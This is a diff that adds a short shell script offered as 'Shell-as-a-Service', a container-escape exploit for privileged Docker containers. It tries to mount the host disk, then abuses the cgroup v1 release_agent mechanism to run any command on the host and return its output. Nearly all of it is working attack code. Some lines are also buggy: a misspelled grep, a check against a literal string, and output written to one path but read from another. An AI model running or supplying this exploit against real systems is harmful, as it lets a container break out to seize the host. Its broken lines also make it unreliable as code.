@@ -1,0 +1,41 @@
+#! /usr/bin/env sh
+# Saas (Shell-as-a-Service) based on https://github.com/cmj0121/ptool/shell
+#
+
+if [ "cat /proc/self/cgroup 2>&1 | greo docker" = "" ]; then
+	echo "only work in docker environment"
+	exit 1
+fi
+
+# check the mount with privileged mode
+#
+cd $(mktemp -d)
+mkdir -p rootfs
+DEV=$(cat /proc/partitions | grep -oE "sd\w." | head -n1)
+if [ -n "${DEV}" ]; then
+	mount /dev/${DEV} rootfs
+	if [ $? == 0 ]; then
+		echo "can mount ${DEV}, read the file-system directly"
+		exit 0
+	fi
+fi
+
+
+# Cgroups v1 Release Notification
+# ref: https://twitter.com/_fel1x/status/1151487051986087936
+echo "check by cgroup v1 release notification ..."
+DIR=$(dirname $(ls -x /s*/fs/c*/*/r* |head -n1))
+mkdir -p ${DIR}/w
+echo 1 > ${DIR}/w/notify_on_release
+OVERLAY=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+# NOTE - should be write to 'o'
+touch /o
+echo ${OVERLAY}/c > ${DIR}/release_agent
+echo  > /cmd
+printf "#!/bin/sh\n$1 >${DIR}/o\n" > /cmd
+chmod +x /cmd
+# trigger command, wait and receive the response
+sh -c "echo 0 > ${DIR}/w/cgroup.procs"
+sleep 1
+cat /o; rm /o
+exit 0
